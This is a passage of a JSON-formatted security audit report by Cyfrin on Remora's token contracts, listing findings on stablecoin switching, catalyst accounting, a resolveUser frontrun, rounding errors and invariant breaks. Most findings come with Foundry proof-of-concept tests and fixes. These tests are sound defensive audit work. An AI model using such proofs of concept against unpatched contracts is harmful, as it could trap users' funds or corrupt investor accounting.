vm.expectPartialRevert(bytes4(keccak256(\"ERC20InsufficientBalance(address,uint256,uint256)\")));\n        d_childTokenProxy.burn();\n    }\n```\n\n**Recommended Mitigation:** Initially, it might seem that one elegant solution to the problem is to store a copy of the current stablecoin address in the `TokenData` structure. This has the advantage of allowing holders of existing central tokens to still claim the funds they are entitled to. In the case that the stablecoin has gone down in value the loss has been socialised to everyone who was entitled to that stablecoin. Whether this is acceptable or not will affect the mitigation, but it is _one_ solution.\n\nHowever, the solution outline above does not take into account calling the following scenario:\n- `distributePayout`\n- followed by `setStableCoin`\n- followed by `distributePayment` or `enableBurning`\n\nThus, to handle the transition from one stablecoin to the next (possibly multiple times) it will be necessary to store the address of the stablecoin on a _per-payout_ and _per-enable-burn_ basis, which adds significant complexity.\n\nAnother solution would be to prevent calling `setStablecoin` unless all current central tokens were inactive. However, this does not account for the stablecoin-de-pegging scenario.\n\nA third solution would involve withdrawing the existing stablecoins and replacing them with an equivalent amount of the new stablecoin, however, this would shift the risk of a de-pegging event to Remora.\n\nThere are many design considerations to take into account.\n\n**Remora:** Fixed at commit [470ed74](https://github.com/remora-projects/remora-dynamic-tokens/commit/470ed749b6657d74746910129865964c053102ab)\n\n**Cyfrin:** Verified. PaymentSettler transfers the balance of the existing stablecoin to the custodian (which includes fees), resets fees, and pulls the same amount of required stablecoin of the new stablecoin that the system must have to process payouts.\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 1095,
      "end_line": 1161,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Calling `PaymentSettler::setStableCoin` can lead to inability of holders to claim funds and old stablecoin being trapped in the contract"
    },
    {
      "index": 13,
      "page_start": null,
      "heading": "Removing Individuals from groups doesn't properly decrement the `groups.numCatalyst` to track the number of catalysts on that group",
      "markdown": "### Removing Individuals from groups doesn't properly decrement the `groups.numCatalyst` to track the number of catalysts on that group\n\n**Description:** When removing an individual from a group, the `group.numCatalyst` counter only checks if the individual's `numCatalyst` is != 0; if so, it decrements `group.numCatalyst` by 1, regardless of how many entities the individual is a catalyst for.\nThe problem is that each individual can be a catalyst on multiple entities, and each time the individual is set as the catalyst on an entity, both the individual and the group `numCatalyst` grow.\n```solidity\n//FiveFiftyRule.sol//\n    function createEntity(\n        ...\n    ) external restricted {\n        ...\n        uint16 gid = individualData[catalyst].groupId;\n//@audit-info => The same catalyst increments the numCatalyst counter on the group each time it's added as a catalyst on a != entity!\n@>      if (gid != 0) ++groups[gid].numCatalyst;\n\n        ...\n    }\n\n    function removeIndividual(uint16 id, address individual) external restricted {\n        ...\n        GroupData storage gData = groups[id];\n//@audit-issue => Decrements the group numCatalysts only by one, regardless of how many times the individual is a catalyst on != entities\n@>      if (iData.numCatalyst != 0) --gData.numCatalyst;\n\n        ...\n    }\n\n```\n\nSo, the `group.numCatalyst` increments each time an individual is set as a catalyst on an entity, but when the individual is removed from the group, `group.numCatalyst` decrements by one, regardless of how many times it was incremented because of the individual being assigned as a catalyst on multiple entities.\n\n**Impact:** `groups.numCatalyst` can be incorrect and fail to accurately track the actual number of catalysts among all entities where individuals are registered as catalysts. This can cause the execution path in the `FiveFiftyRule::canTransfer` function to follow the wrong path and, subsequently, make incorrect updates to the accounting.\n\n**Proof of Concept:** In the below PoC, it is demonstrated that the same individual can be assigned as a catalyst for two entities; this will cause the individual and group `numCatalyst` to increase to two, and when the individual is removed from the group he belongs to, the `group.numCatalyst` will only be decremented by one, which will leave the accounting incorrectly considering there is an individual on the group who is a catalyst on an entity.\n\nAdd the next PoC to the `FiveFiftyRuleTest.t.sol` test file:\n```solidity\n    function test_numCatalystInGroupsPoC() public {\n        // create group with one member\n        address u = getDomesticUser(0);\n        address u2 = getDomesticUser(1);\n        address[] memory inds = new address[](2);\n        inds[0] = u;\n        inds[1] = u2;\n\n        uint16 gid = 10;\n\n        address entityA = makeAddr(\"entityA\");\n        address entityB = makeAddr(\"entityB\");\n\n        fiveFiftyProxy.createGroup(gid, inds);\n\n        //@audit => Create two entities where individual `u` is the catalyst\n        fiveFiftyProxy.createEntity(entityA, u, 100, 100, inds);\n        fiveFiftyProxy.createEntity(entityB, u, 100, 100, inds);\n\n        assertEq(fiveFiftyProxy.getGroupNumCatalyst(gid), 2);\n\n        //@audit => Remove the only user of the group who is a numCatalyst on entities\n        fiveFiftyProxy.removeIndividual(gid, u);\n        //@audit-issue => The numCatalyst is left as 1 even though any of the remaining individuals in the group is a catalyst on an entity\n        assertEq(fiveFiftyProxy.getGroupNumCatalyst(gid), 1);\n    }\n```\n\n**Recommended Mitigation:** Consider refactoring the accounting to track the `group.numCatalyst` correctly, ensuring it is updated when removing and adding individuals to a group, as well as when setting an individual as a catalyst of an entity. Ensure there is a symmetric relation among these operations.\n\n**Remora:** Fixed at commit [588b165](https://github.com/remora-projects/remora-dynamic-tokens/commit/588b165ddf74a8ef94035f47bfaac878a35dbfa1).\n\n**Cyfrin:** Verified.  `group.numCatalyst` counter increments and decrements symmetrically. Regardless of how many times the same individual serves as a catalyst for different entities, the count `group.numCatalyst` only increases by 1 for each individual who is a catalyst.\n\n\\clearpage\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 1161,
      "end_line": 1232,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Removing Individuals from groups doesn't properly decrement the `groups.numCatalyst` to track the number of catalysts on that group"
    },
    {
      "index": 14,
      "page_start": null,
      "heading": "Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice",
      "markdown": "### Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice\n\n**Description:** When resolving a user to migrate his tokens, lock progress, and payouts from an address to a new address, the balance of `ChildToken` of the `oldAddress` is transferred by directly calling the `super:_transfer`, which bypasses the overrides of the `super::_transfer`. Calling `super::_transfer` bypasses a protection that returns the execution early when transferring a zero value.\nThis allows the execution to reach `ChildToken::_update()` with a balance of 0 for the `from` account and a transfer of zero value. As a result, the `totalInvestors` counter will be decremented, because the condition evaluating whether the sender is zeroing out their balance will be met.\n```solidity\n//ChildToken.sol//\n\n    function resolveUser(address oldAddress, address newAddress) external nonReentrant restricted {\n        ...\n @>     super._transfer(oldAddress, newAddress, value); // tokens already locked with _newAccountSameLocks\n    }\n\n    function _update(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n @>     if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;\n        if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;\n\n        ...\n    }\n```\n\nThe previous behavior when resolving a user who has no balance allows for legitimate executions to determine users to be griefed and force the `totalInvestors` counter to be decremented twice. One for the frontran transaction, which transfers all the `oldAddress` tokens (because the sender is zeroing out their balance). Again, when the transaction calling `ChildToken::resolveUser` is executed and resolves the user with a zero balance (as explained above), this will also cause `investorBalance` to be decremented.\n\n\n**Impact:** The `totalInvestor` counter is decremented twice, which causes the system to inaccurately track the actual number of investors in the system.\nThis issue can cause transfers of other investors to fall into DoS when transferring all their balances (given sufficient manipulations of the `totalInvestor` counter). However, thanks to the lock-up periods, the likelihood of reaching a DoS state is low.\n\n**Proof of Concept:** Add the following PoC to `ChildTokenAdminTest.t.sol`:\n```solidity\n    function test_resolveUser_FrontRanHijacks_totalInvestorCounter() public {\n        address oldUser = getDomesticUser(1);\n        address newUser = getDomesticUser(2);\n        address extraInvestor = getDomesticUser(3);\n\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(extraInvestor, 1);\n\n        // Seed: old user has 3 tokens (locked by default on mint)\n        centralTokenProxy.mint(address(this), uint64(3));\n        centralTokenProxy.dynamicTransfer(oldUser, 3);\n        assertEq(d_childTokenProxy.balanceOf(oldUser), 3);\n\n        // Distribute payout via PaymentSettler -> Central -> Child\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);\n        paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6) total\n\n        assertEq(d_childTokenProxy.totalInvestors(), 2);\n\n        uint32 DEFAULT_LOCK_TIME = 365 days;\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);\n\n        //@audit-info => `oldUser` frontruns `resolveUser()` and transfers all of his balance!\n        vm.prank(oldUser);\n        d_childTokenProxy.transfer(newUser, 3);\n\n        //@audit-info => Doesn't revert even though `oldUser` has 0 balance\n        // Resolve: move state to newUser (already allowlisted + signed in base)\n        d_childTokenProxy.resolveUser(oldUser, newUser);\n\n        //@audit-issue => Only 1 investor when in reality are 2 (newUser and extraInvestor)\n        assertEq(d_childTokenProxy.totalInvestors(), 1);\n\n        //@audit-info => newUser transfers all his tokens to extraInvestor - totalInvestors shrinks\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);\n        vm.prank(newUser);\n        d_childTokenProxy.transfer(extraInvestor, 3);\n        assertEq(d_childTokenProxy.totalInvestors(), 0);\n\n        //@audit-issue => underflow because totalInvestors is 0 and extraInvestor is transferring all of his balance\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);\n        vm.prank(extraInvestor);\n        vm.expectRevert();\n        d_childTokenProxy.transfer(newUser, 4);\n    }\n```\n\n**Recommended Mitigation:** Consider adding a check to validate if the `oldAddress` `balanceOf` ChildToken is 0, if so, revert the tx.\n\n**Remora:** Fixed at commit [6f53406](https://github.com/remora-projects/remora-dynamic-tokens/commit/6f53406266490f5ad66202fb82efef7d64980955)\n\n**Cyfrin:** Verified. Added a check to call `super._transfer()` only when the `oldAddress` has a balance.\n",
      "finding_id": null,
      "severity": "Low",
      "start_line": 1235,
      "end_line": 1321,
      "description": null,
      "metadata": {
        "Severity": "Low",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice"
    },
    {
      "index": 15,
      "page_start": null,
      "heading": "Minting in between disabling and re-enabling burning leads to stuck funds and dilution of later burners",
      "markdown": "### Minting in between disabling and re-enabling burning leads to stuck funds and dilution of later burners\n",
      "finding_id": null,
      "severity": "Low",
      "start_line": 1321,
      "end_line": 1323,
      "description": null,
      "metadata": {
        "Severity": "Low",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Minting in between disabling and re-enabling burning leads to stuck funds and dilution of later burners"
    },
    {
      "index": 16,
      "page_start": null,
      "heading": "`FiveFiftyRule::_updateEntityAllowance` rounds in wrong direction for entity allowance subtraction",
      "markdown": "### `FiveFiftyRule::_updateEntityAllowance` rounds in wrong direction for entity allowance subtraction\n\n**Description:** Function `_updateEntityAllowance` is used to either increase/decrease the entity allowance based on where parameter `add` is `true`/`false`.\n\nWhen `add == false`, `adjusted_amt` is the amount to subtract. However, it is truncated because division is involved.\nThis means that `aData.allowance - adjusted_amt` will be bigger than the true value.\n\nIn the worse case scenario this can mean that the allowance is now too large and that a subsequent transfer to the entity will make it violate the 5/50 rule.\n\n**Impact:** In extreme cases the 5/50 rule can be violated. The bug identified in Issue [*Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) makes this much more likely as division before multiplication results in values that are much smaller than the true value.\n\n**Proof of Concept:**\n1. This diff will fix bugs that obscure this particular problem.\n\n```diff\n@@ -465,8 +465,8 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {\n         uint256 len = ents.length;\n         for (uint256 i; i<len; ++i) {\n             EntityData memory a = entityData[ents[i]];\n-            if (a.catalyst == inv &&\n-                (REMORA_PERCENT_DENOMINATOR / a.equity) * amount >\n+            if (a.catalyst == inv &&\n+                REMORA_PERCENT_DENOMINATOR * amount / a.equity >\n                     entityData[ents[i]].allowance\n             ) return false;\n         }\n@@ -505,16 +505,16 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {\n         // to side changes\n         if (to != address(0)) {\n             IndividualData storage iTo = individualData[to];\n-\n+\n             if (iTo.isEntity) { // if entity\n-                if (entityData[to].allowance <= amount) {\n-                    entityData[to].allowance -= SafeCast.toUint64(amount);\n+                if (entityData[to].allowance >= amount) {\n+                    entityData[to].allowance -= SafeCast.toUint64(amount);\n\n                     iTo.lastBalance += SafeCast.toUint64(amount);\n                     emit FiveFiftyApproved(from, to, amount);\n                     return true;\n                 } else revert ();\n```\n\n2. This proof of concept shows that it is possible for the catalyst to have an exposure equal to the 10% (when they should always be below it at 9.999999%).\n\n**NOTE**: If the \"division before multiply\" bug from Issue [*Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) is not fixed then a value of `CATALYST_BAL = 700_000` will still not revert leading to the effective cap being exceeded by approximately 2%!\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.30;\n\nimport \"forge-std/console2.sol\";\nimport {RemoraTestBase} from \"../RemoraTestBase.sol\";\nimport {FiveFiftyRule} from \"../../../contracts/Compliance/FiveFiftyRule.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n\ncontract FiveFiftyRule_RoundingPoC is RemoraTestBase {\n    FiveFiftyRule internal fiveFiftyRule;\n\n    // helpers (same as your math discussion)\n    uint256 constant DENOM = 1_000_000;\n\n    function setUp() public override {\n        RemoraTestBase.setUp();\n\n        // Deploy rule and initialize\n        fiveFiftyRule = FiveFiftyRule(address(new ERC1967Proxy(address(new FiveFiftyRule()), \"\")));\n        fiveFiftyRule.initialize(address(accessMgrProxy), 0);\n\n        // Allow our test to call restricted functions on fiveFiftyRule and child\n        bytes4[] memory sel = new bytes4[](1);\n        sel[0] = FiveFiftyRule.addToken.selector;\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), sel, ADMIN_TOKEN_ID);\n        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);\n\n        bytes4[] memory cs = new bytes4[](2);\n        cs[0] = bytes4(keccak256(\"setFiveFiftyCompliance(address)\"));\n        cs[1] = bytes4(keccak256(\"setLockUpTime(uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(d_childTokenProxy), cs, ADMIN_TOKEN_ID);\n\n        // Wire fiveFiftyRule to domestic child; remove lockup\n        d_childTokenProxy.setFiveFiftyCompliance(address(fiveFiftyRule));\n        d_childTokenProxy.setLockUpTime(0);\n    }\n\n    function test_RoundingDown_Allows_ExtraEntityToken_ExceedingLookThroughCap() public {\n        // --------------------------\n        // Parameters we use for the PoC\n        // --------------------------\n        // Total supply: large, so we can transfer a very large amount to the catalyst without violating the cap.\n        // We'll target a 50% cap for the catalyst (to leave room for a huge direct transfer).\n        uint64 totalSupply = 10_000_000;\n        uint32 capPercent = 100_000;\n        uint64 capAmountMicros = totalSupply * capPercent;\n\n        uint64 equityMu = 333_334;\n        uint256 ENTITY_BAL = 1_500_000;\n        uint256 CATALYST_BAL = 499_999;\n\n        centralTokenProxy.mint(address(this), totalSupply);\n        fiveFiftyRule.addToken(address(centralTokenProxy));\n\n        // Choose a catalyst (a domestic user) and an entity address\n        address entity = getDomesticUser(0);\n        address catalyst = getDomesticUser(1);\n        address otherInvestor = getDomesticUser(2); // will never directly own any tokens in this example\n        address[] memory investors = new address[](2);\n        investors[0] = catalyst;\n        investors[1] = otherInvestor;\n\n        bytes4[] memory psel = new bytes4[](1);\n        psel[0] = bytes4(keccak256(\"setMaxPercentIndividual(address,uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), psel, ADMIN_TOKEN_ID);\n        fiveFiftyRule.setMaxPercentIndividual(catalyst, capPercent);\n\n\n        bytes4[] memory esel = new bytes4[](2);\n        esel[0] = bytes4(keccak256(\"createEntity(address,address,uint64,uint64,address[])\"));\n        esel[1] = bytes4(keccak256(\"setCatalyst(bool,address,address,uint64,uint64)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), esel, ADMIN_TOKEN_ID);\n\n\n        uint64 calculatedAllowance = SafeCast.toUint64(totalSupply * 1e6 * capPercent / equityMu);\n        console2.log(\"calculatedAllowance: %s\", calculatedAllowance);\n\n        // Check that allowance is correct\n        uint256 userProportion = calculatedAllowance * equityMu / 1e6;\n        assertEq(userProportion, capAmountMicros - 1);\n\n        uint256 exposure = uint256(ENTITY_BAL)* 1e6 * equityMu / 1e6 + CATALYST_BAL * 1e6;\n        console2.log(\"exposure: %s\", exposure);\n        assertGe(exposure, capAmountMicros);\n\n\n        fiveFiftyRule.createEntity(entity, catalyst, equityMu, calculatedAllowance, investors);\n        centralTokenProxy.dynamicTransfer(entity, ENTITY_BAL);\n        logEntity(\"0\", entity);\n        logIndividual(\"entity 0\", entity);\n        logIndividual(\"catalyst 0\", catalyst);\n\n        centralTokenProxy.dynamicTransfer(catalyst, CATALYST_BAL);\n        logEntity(\"1\", entity);\n        logIndividual(\"entity 1\", entity);\n        logIndividual(\"catalyst 1\", catalyst);\n\n    }\n\n    function logEntity(string memory s, address entity) internal view {\n        FiveFiftyRule.EntityData memory ed = fiveFiftyRule.testing_entityData(entity);\n        console2.log(\"---  EntityData %s ---\", s );\n        console2.log(\"catalyst:     %s\", ed.catalyst);\n        console2.log(\"equity:       %s\", ed.equity);\n        console2.log(\"allowance:    %s\", ed.allowance);\n    }\n\n    function logIndividual(string memory s, address individual) internal view {\n        FiveFiftyRule.IndividualData memory id = fiveFiftyRule.testing_individualData(individual);\n        console2.log(\"---  IndividualData %s ---\", s);\n        console2.log(\"isEntity:         %s\", id.isEntity);\n        console2.log(\"numCatalyst:      %s\", id.numCatalyst);\n        console2.log(\"groupId:          %s\", id.groupId);\n        console2.log(\"customMaximum:    %s\", id.customMaximum);\n        console2.log(\"lastBalance:      %s\", id.lastBalance);\n\n    }\n}\n```\n\n**Recommended Mitigation:** The `adjusted_amt` must be rounded up when `add == false`.\n\nUpdate the code as below, assuming the existence of `_mulDivFloor` and `_mulDivCeil`, which round down/up respectively.\nIt also includes the fix from Issue [*Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded).\n\n```solidity\nfunction _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {\n    uint8 numCatalyst = individualData[inv].numCatalyst;\n    uint256 len = findEntity[inv].length;\n\n    for (uint256 i; i < len; ++i) {\n        if (numCatalyst == 0) break;\n\n        EntityData storage aData = entityData[findEntity[inv][i]];\n        if (aData.catalyst != inv) continue;\n        --numCatalyst;\n\n        uint256 adjusted;\n        if (add) {\n            adjusted = _mulDivFloor(amount, REMORA_PERCENT_DENOMINATOR, aData.equity);\n            aData.allowance += SafeCast.toUint64(adjusted);\n        } else {\n            adjusted = _mulDivCeil(amount, REMORA_PERCENT_DENOMINATOR, aData.equity);\n            uint64 adj64 = SafeCast.toUint64(adjusted);\n            if (adj64 > aData.allowance) return false;\n            aData.allowance -= adj64;\n        }\n    }\n    return true;\n}\n```\n\n**Remora:** Fixed at commit [e12af9d](https://github.com/remora-projects/remora-dynamic-tokens/commit/e12af9dd70476a143f444a793aff3538b136ca1a).\n\n**Cyfrin:** Verified. Implemented recommended mitigation.\n",
      "finding_id": null,
      "severity": "Low",
      "start_line": 1525,
      "end_line": 1733,
      "description": null,
      "metadata": {
        "Severity": "Low",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "`FiveFiftyRule::_updateEntityAllowance` rounds in wrong direction for entity allowance subtraction"
    },
    {
      "index": 17,
      "page_start": null,
      "heading": "In `FiveFiftyRule` add check that `equity != 0` in functions `createEntity` and `setCatalyst`",
      "markdown": "### In `FiveFiftyRule` add check that `equity != 0` in functions `createEntity` and `setCatalyst`\n\n**Description:** If `equity` is ever set to zero then `_checkEntityAllowance` will revert on division by zero which will prevent all transfers that pass through the code paths involving `_checkEntityAllowance`.\n\nThis will occur any time a transfer involves a transfer to a `to` address which is\n- part of a group with an individual that is a catalyst\n- is an individual that is a catalyst\n\n**Impact:** Minimal. Reverts will happen until an admin calls `setCatalyst` to update the `equity` to a non-zero value.\n\n**Remora:** Fixed at commit [511e7da](https://github.com/remora-projects/remora-dynamic-tokens/commit/511e7da2038e669f628c8232fd8f37c1e6798fab).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n",
      "finding_id": null,
      "severity": "Low",
      "start_line": 1733,
      "end_line": 1748,
      "description": null,
      "metadata": {
        "Severity": "Low",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "In `FiveFiftyRule` add check that `equity != 0` in functions `createEntity` and `setCatalyst`"
    },
    {
      "index": 18,
      "page_start": null,
      "heading": "Admin could use `CentralToken::transferFrom` after approval to break 1:1 invariant in child token",
      "markdown": "### Admin could use `CentralToken::transferFrom` after approval to break 1:1 invariant in child token\n\n**Description:** Function `transfer` contains `_checkAllowedAdmin(to)` which prevents an admin (accidentally or otherwise) sending a `CentralToken` to a `ChildToken` directly.\n\n```solidity\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        if (amount == 0) return true;\n        _checkAllowedAdmin(to);\n        return super.transfer(to, amount);\n    }\n```\n\nHowever, `transferFrom` is not overridden so it is possible for an admin to:\n- `approve` the `CentralToken` contract\n- call `transferFrom(address(this), childToken, amount)` (for some `childToken` and `amount`)\n\nThis will immediately brick the `ChildToken` contract from minting since `mint` contains this check:\n\n```solidity\nfunction mint(address to, uint256 amount) external whenNotPaused {\n...\n        if(ICentralToken(cToken).balanceOf(address(this)) != totalSupply() + amount)\n            revert CentralBalanceInvariant();\n```\n\n**Impact:** An admin's transfer can permanently disabled `CentralToken::dynamicTransfer` being called when it would send tokens to the `ChildToken` with the broken invariant.\n\nFurther, the directly-transferred token could not be recovered using `ChildToken::burn` since it never had a `ChildToken` minted for it.\n\n**Proof of Concept:** Add this test to `CentralTokenTest.t.sol`\n\n```solidity\nfunction test_cyfrin_brickMintingInChildToken() public {\n    address dom = getDomesticUser(0);\n    centralTokenProxy.mint(address(this), uint64(4));\n\n    // send 1 token to the child contract directly, after approving\n    centralTokenProxy.approve(address(this), type(uint256).max);\n    centralTokenProxy.transferFrom(address(this), address(d_childTokenProxy), 1);\n\n    vm.expectRevert(bytes4(keccak256(\"CentralBalanceInvariant()\")));\n    centralTokenProxy.dynamicTransfer(dom, 3);\n}\n```\n\n**Recommended Mitigation:**\n1. Override `transferFrom` with the following definition\n\n```solidity\nfunction transferFrom(address from, address to, uint256 amount) public override returns (bool) {\n    if (amount == 0) return true;\n    _checkAllowedAdmin(to);\n    return super.transferFrom(from, to, amount);\n}\n```\n\n2. It may also be worth disabling the `approve` function if it is not strictly needed\n\n3. It may also be worth updating `Allowlist.addUser` to check whether a user's address is a contract, or if you want to allow contracts, checking that it doesn't satisfy the interface of `ChildToken`\n\n**Remora:** Fixed at commit [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484).\n\n**Cyfrin:** Verified. `transfer()` and `transferFrom()` are overridden, and a validation was added to prevent the recipient from being a ChildToken.\n",
      "finding_id": null,
      "severity": "Informational",
      "start_line": 1751,
      "end_line": 1816,
      "description": null,
      "metadata": {
        "Severity": "Informational",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Admin could use `CentralToken::transferFrom` after approval to break 1:1 invariant in child token"
    },
    {
      "index": 19,
      "page_start": null,
      "heading": "Consider explicitly denying `allowUser` assigning admin privileges to`ChildToken` contracts",
      "markdown": "### Consider explicitly denying `allowUser` assigning admin privileges to`ChildToken` contracts\n\n**Description:** The 1:1 invariant of a child token can be broken as follows:\n\nAdmin:\n- calls `allowUser` on a child token contract\n- calls `transfer` to directly send central token to the child token\n\nThis breaks the 1:1 invariant.\n\nThis is clearly something only a malicious admin would do, so this has been classified as Informational.\n\n**Impact:** 1:1 invariant of child token is broken, bricking any further minting.\n\n**Proof of Concept:** Add this to `CentralTokenTest.t.sol`\n\n```solidity\n    function test_cyfrin_brickMintingByAllowingChildTokenAsAdmin() public {\n        address dom = getDomesticUser(0);\n        centralTokenProxy.mint(address(this), uint64(4));\n\n        allowListProxy.allowUser(address(d_childTokenProxy), true, true, true);\n        centralTokenProxy.transfer(address(d_childTokenProxy), 1);\n\n\n        vm.expectRevert(bytes4(keccak256(\"CentralBalanceInvariant()\")));\n        centralTokenProxy.dynamicTransfer(dom, 3);\n    }\n```\n**Remora:** Fixed at commit [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484).\n\n**Cyfrin:** Verified. `transfer()` and `transferFrom()` are overridden preventing ChildTokens from receiving CentralTokens via a direct transfer or transferFrom.\n",
      "finding_id": null,
      "severity": "Informational",
      "start_line": 1816,
      "end_line": 1850,
      "description": null,
      "metadata": {
        "Severity": "Informational",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Consider explicitly denying `allowUser` assigning admin privileges to`ChildToken` contracts"
    },
    {
      "index": 20,
      "page_start": null,
      "heading": "Logic of `FiveFiftyRule::checkCanTransfer` and `FiveFiftyRule::canTransfer` can subtle differ",
      "markdown": "### Logic of `FiveFiftyRule::checkCanTransfer` and `FiveFiftyRule::canTransfer` can subtle differ\n\n**Description:** There are subtle differences in the `checkCanTransfer` and `canTransfer` functions on the `FiveFiftyRule` contract that could make the result of the execution on both of them differ.\nThe most notable difference is shown on the snippet below:\n1. On `canTransfer`, it considers the `gid` on the conditional\n2. On `checkCanTransfer`, it doesn't consider the `gid` on the conditional\n\n```solidity\n//FiveFiftyRule.sol//\n    function canTransfer(address from, address to, uint256 amount) external returns (bool) {\n        ...\n\n        // to side changes\n        if (to != address(0)) {\n            ...\n            } else if (gId == 0 && iTo.numCatalyst != 0 &&\n                !_updateEntityAllowance(false, to, amount)\n            ) revert();\n\n            ...\n        }\n\n        ...\n    }\n\nfunction checkCanTransfer(\n    address to,\n    uint256 amount\n) external view returns (bool _output) {\n    ...\n    } else if (iData.numCatalyst != 0 &&\n        !_checkEntityAllowance(to, amount)\n    ) return false;\n\n    ...\n}\n\n```\n\n**Recommended Mitigation:** Consider making them have the same logic by factoring out common logic into internal functions.\n\n**Remora:** Acknowledged.\n\n**Cyfrin:** Verified.\n",
      "finding_id": null,
      "severity": "Informational",
      "start_line": 1850,
      "end_line": 1896,
      "description": null,
      "metadata": {
        "Severity": "Informational",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Logic of `FiveFiftyRule::checkCanTransfer` and `FiveFiftyRule::canTransfer` can subtle differ"
    },
    {
      "index": 21,
      "page_start": null,
      "heading": "`TokenBank::setCustodian` should ensure custodian has ADMIN privileges",
      "markdown": "### `TokenBank::setCustodian` should ensure custodian has ADMIN privileges\n\n**Description:** If the `TokenBank::setCustodian` is called and they don't have ADMIN privileges then `TokenBank::removeToken` will revert since the call to `safeTransfer` will indirectly call `CentralToken.transfer` which has this implementation:\n\n```solidity\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        if (amount == 0) return true;\n        _checkAllowedAdmin(to);\n        return super.transfer(to, amount);\n    }\n```\n\n**Impact:** Minimal since admin can always just call `setCustodian` again or give ADMIN privileges to the custodian.\n\n**Recommended Mitigation:** Add one line to `setCustodian`\n\n```solidity\nrequire(allowlist.allowed(newCustodian) && allowlist.isAdmin(newCustodian),\n        \"Custodian must be allowlist admin\");\n```\n\n**Remora:** Fixed at commit [a3ae706](https://github.com/remora-projects/remora-dynamic-tokens/commit/a3ae70627dbeb55ac5f9bfeb6ab4a4512703c6c8)\n\n**Cyfrin:** Verified.\n",
      "finding_id": null,
      "severity": "Informational",
      "start_line": 1896,
      "end_line": 1922,
      "description": null,
      "metadata": {
        "Severity": "Informational",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "`TokenBank::setCustodian` should ensure custodian has ADMIN privileges"
    },
    {
      "index": 22,
      "page_start": null,
      "heading": "Extra validation on `CentralToken::addChildToken` will prevent adding incorrect `ChildToken`",
      "markdown": "### Extra validation on `CentralToken::addChildToken` will prevent adding incorrect `ChildToken`\n\n**Description:** Currently, it is possible to:\n- Create a `childToken0` which sets `centralToken0` as its parent\n- For a different central call `centralToken1::addChildToken(centralToken0)`\n\n**Recommended Mitigation:** To prevent this mismatch the following extra validation is recommended:\n\n```diff\n+  error ChildTokenNotChildOfThis();\n```\n\n```diff\n  interface IChildRWAToken {\n+     function centralToken() external view returns (address);\n      function domestic() external view returns (bool);\n      function distributePayout(uint128 amount) external;\n      function mint(address to, uint256 amount) external;\n      function balanceOf(address account) external view returns (uint256);\n      function toggleBurning(bool newState) external;\n      function togglePause(bool newState) external;\n}\n```\n\n```diff\n    function addChildToken(\n        address tokenAddress\n    ) external nonReentrant restricted {\n        if (tokenAddress == address(0) || tokenAddress.code.length == 0)\n            revert InvalidAddress();\n\n+       if (IChildRWAToken(tokenAddress).centralToken() != address(this)) revert ChildTokenNotChildOfThis();\n        // 0 